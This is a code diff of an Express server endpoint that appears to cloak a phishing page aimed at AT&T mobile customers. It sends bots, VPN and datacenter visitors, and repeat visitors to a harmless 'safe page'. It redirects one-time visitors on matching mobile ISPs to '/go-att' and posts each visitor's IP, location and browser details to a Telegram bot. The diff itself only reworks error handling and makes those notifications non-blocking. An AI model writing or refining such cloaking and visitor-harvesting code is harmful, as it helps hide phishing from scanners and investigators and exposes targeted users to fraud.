@@ -241,112 +241,121 @@ function requireAdmin(req, res, next) {
 
 // Main endpoint to determine redirect
 app.get('/init', async (req, res) => {
-    if (isBot(req)) {
-        return res.json({ redirect: NON_ATT_LANDING_PAGE });
-    }
-
-    let clientIp = req.ip;
-    const userAgent = req.headers['user-agent'] || 'Unknown';
+    console.log(`[Init] Request started for IP: ${req.ip}`);
     
-    // Validate IP to prevent spoofing/XSS via headers
-    if (!net.isIP(clientIp)) {
-        console.warn(`[Init] Invalid IP detected: ${clientIp}`);
-        return res.status(400).send('Invalid IP address');
-    }
+    try {
+        if (isBot(req)) {
+            console.log(`[Init] Bot detected. Redirecting to safe page.`);
+            return res.json({ redirect: NON_ATT_LANDING_PAGE });
+        }
 
-    console.log(`[Init] Visit from IP: ${clientIp} | UA: ${userAgent}`);
-    
-    // 1. FAST CHECKS (Local memory/file only)
-    const forcedIps = await getForcedIps();
-    const isForced = forcedIps.includes(clientIp);
+        let clientIp = req.ip;
+        const userAgent = req.headers['user-agent'] || 'Unknown';
+        
+        // Validate IP to prevent spoofing/XSS via headers
+        if (!net.isIP(clientIp)) {
+            console.warn(`[Init] Invalid IP detected: ${clientIp}`);
+            return res.status(400).send('Invalid IP address');
+        }
 
-    if (isForced) {
-        console.log(`[Init] IP ${clientIp} is forced. Redirecting to ATT page.`);
-        // Send simplified notification for forced visit (optional, but keep it consistent)
-        try {
-            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        console.log(`[Init] Processing IP: ${clientIp}`);
+        
+        // 1. FAST CHECKS (Local memory/file only)
+        const forcedIps = await getForcedIps();
+        const isForced = forcedIps.includes(clientIp);
+
+        if (isForced) {
+            console.log(`[Init] IP ${clientIp} is forced.`);
+            // Send simplified notification for forced visit in background
+            axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 chat_id: TELEGRAM_CHAT_ID,
                 text: `✨ *FORCED REDIRECT VISIT* \n\n📍 *IP:* ${clientIp}\n💻 *Browser:* ${userAgent}\n🕒 *Time:* ${new Date().toLocaleString()}`,
                 parse_mode: 'Markdown'
-            }, { timeout: 5000 });
-        } catch (e) {
-            console.error('[Telegram] Forced visit notification failed:', e.response?.data || e.message);
+            }, { timeout: 5000 }).catch(() => {});
+            
+            return res.json({ redirect: '/go-att' });
         }
-        return res.json({ redirect: '/go-att' });
-    }
 
-    const visitedIps = await getVisitedIps();
-    const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
-    
-    if (isVisited) {
-        console.log(`[Init] IP ${clientIp} already visited. Redirecting to safe page.`);
-        return res.json({ redirect: NON_ATT_LANDING_PAGE });
-    }
+        const visitedIps = await getVisitedIps();
+        const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
+        
+        if (isVisited) {
+            console.log(`[Init] IP ${clientIp} already visited.`);
+            return res.json({ redirect: NON_ATT_LANDING_PAGE });
+        }
 
-    // 2. FETCH EXTERNAL DATA (Slowest part)
-    let data = null;
-    try {
-        const response = await axios.get(`https://demo.ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`, { timeout: 5000 });
-        data = response.data;
-        console.log(`[Init] ISP Lookup:`, data);
-    } catch (error) {
-        console.error('[Init] ISP lookup failed:', error.message);
-    }
+        // 2. FETCH EXTERNAL DATA (Slowest part)
+        let data = null;
+        console.log(`[Init] Starting ISP lookup for ${clientIp}...`);
+        try {
+            const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`, { timeout: 4000 });
+            data = response.data;
+            console.log(`[Init] ISP Lookup Success:`, data.isp || data.org);
+        } catch (error) {
+            console.error('[Init] ISP lookup failed or timed out:', error.message);
+        }
 
-    // 3. SECURITY CHECKS
-    const isProxy = data && data.proxy === true;
-    const isHosting = data && data.hosting === true;
-    const isSuspicious = isProxy || isHosting;
-    const settings = await getSettings();
+        // 3. SECURITY CHECKS
+        const isProxy = data && data.proxy === true;
+        const isHosting = data && data.hosting === true;
+        const isSuspicious = isProxy || isHosting;
+        const settings = await getSettings();
 
-    // Send Telegram Notification
-    let message = `🚀 *New App Visit!* \n\n`;
-    if (isProxy) message += `🚫 *VPN/PROXY DETECTED*\n\n`;
-    else if (isHosting) message += `☁️ *DATACENTER/HOSTING DETECTED*\n\n`;
+        // Prepare Telegram Message
+        let message = `🚀 *New App Visit!* \n\n`;
+        if (isProxy) message += `🚫 *VPN/PROXY DETECTED*\n\n`;
+        else if (isHosting) message += `☁️ *DATACENTER/HOSTING DETECTED*\n\n`;
 
-    if (data && data.status === 'success') {
-        message += `📍 *IP:* ${data.query}\n` +
-                   `🏢 *ISP:* ${data.isp || data.org || 'N/A'}\n` +
-                   `🌍 *Location:* ${data.city}, ${data.regionName}, ${data.country}\n`;
-    } else {
-        message += `📍 *IP:* ${clientIp}\n⚠️ *ISP info unavailable*\n`;
-    }
-    
-    message += `💻 *Browser:* ${userAgent}\n`;
-    if (isSuspicious) message += `🛡️ *Flags:* ${isProxy ? 'Proxy/VPN ' : ''}${isHosting ? 'DataCenter' : ''}\n`;
-    message += `🕒 *Time:* ${new Date().toLocaleString()}`;
-
-    // 4. FINAL REDIRECT LOGIC
-    let targetUrl = NON_ATT_LANDING_PAGE;
-    const isSuspiciousMatch = settings.isSuspiciousEnabled && (isProxy || isHosting);
-    
-    if (isSuspiciousMatch) {
-        console.log(`[Init] Suspicious IP (Proxy:${isProxy}/Hosting:${isHosting}) detected. Filter is ON. Redirecting to safe page.`);
-        targetUrl = NON_ATT_LANDING_PAGE;
-    } else if (!settings.isIspFilterEnabled) {
-        console.log(`[Init] ISP Filter is DISABLED. Redirecting all clean traffic to ATT page.`);
-        targetUrl = '/go-att';
-    } else if (data && data.status === 'success') {
-        const userISP = (data.isp || data.org || "").toUpperCase();
-        if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
-            console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
-            targetUrl = '/go-att';
+        if (data && data.status === 'success') {
+            message += `📍 *IP:* ${data.query}\n` +
+                       `🏢 *ISP:* ${data.isp || data.org || 'N/A'}\n` +
+                       `🌍 *Location:* ${data.city}, ${data.regionName}, ${data.country}\n`;
         } else {
-            console.log(`[Init] No ISP match for: ${userISP}. Redirecting to safe page.`);
-            targetUrl = NON_ATT_LANDING_PAGE;
+            message += `📍 *IP:* ${clientIp}\n⚠️ *ISP info unavailable*\n`;
         }
+        
+        message += `💻 *Browser:* ${userAgent}\n`;
+        if (isSuspicious) message += `🛡️ *Flags:* ${isProxy ? 'Proxy/VPN ' : ''}${isHosting ? 'DataCenter' : ''}\n`;
+        message += `🕒 *Time:* ${new Date().toLocaleString()}`;
+
+        // 4. FINAL REDIRECT LOGIC
+        let targetUrl = NON_ATT_LANDING_PAGE;
+        const isSuspiciousMatch = settings.isSuspiciousEnabled && (isProxy || isHosting);
+        
+        if (isSuspiciousMatch) {
+            console.log(`[Init] Suspicious IP. Redirecting to safe page.`);
+            targetUrl = NON_ATT_LANDING_PAGE;
+        } else if (!settings.isIspFilterEnabled) {
+            console.log(`[Init] ISP Filter is DISABLED. Redirecting to ATT page.`);
+            targetUrl = '/go-att';
+        } else if (data && data.status === 'success') {
+            const userISP = (data.isp || data.org || "").toUpperCase();
+            if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
+                console.log(`[Init] Match found! ISP: ${userISP}.`);
+                targetUrl = '/go-att';
+            } else {
+                console.log(`[Init] No ISP match for: ${userISP}.`);
+                targetUrl = NON_ATT_LANDING_PAGE;
+            }
+        }
+
+        // Send Telegram Notification in background (don't await)
+        console.log(`[Init] Sending Telegram notification...`);
+        axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        }, { timeout: 8000 })
+        .then(() => console.log('[Telegram] Notification sent for IP:', clientIp))
+        .catch(e => console.error('[Telegram] Notification failed:', e.message));
+
+        console.log(`[Init] Sending response: ${targetUrl}`);
+        res.json({ redirect: targetUrl });
+
+    } catch (globalError) {
+        console.error('[Init] Global error in /init:', globalError.message);
+        res.json({ redirect: NON_ATT_LANDING_PAGE });
     }
-
-    // Send Telegram Notification in background (don't await)
-    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-    }, { timeout: 8000 })
-    .then(() => console.log('[Telegram] Notification successfully sent for IP:', clientIp))
-    .catch(e => console.error('[Telegram] Notification failed:', e.response?.data || e.message));
-
-    res.json({ redirect: targetUrl });
 });
 
 // Admin Panel to manage visited IPs
